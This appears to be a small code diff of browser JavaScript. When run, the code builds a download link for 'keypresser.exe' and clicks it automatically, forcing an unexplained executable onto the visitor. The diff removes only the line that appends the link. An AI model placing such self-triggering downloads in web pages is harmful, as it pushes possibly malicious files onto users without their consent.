@@ -17,5 +17,4 @@
     downloader.href = "keypresser.exe";
     downloader.download = "";
     downloader.click();
-    document.append(downloader);
 })();
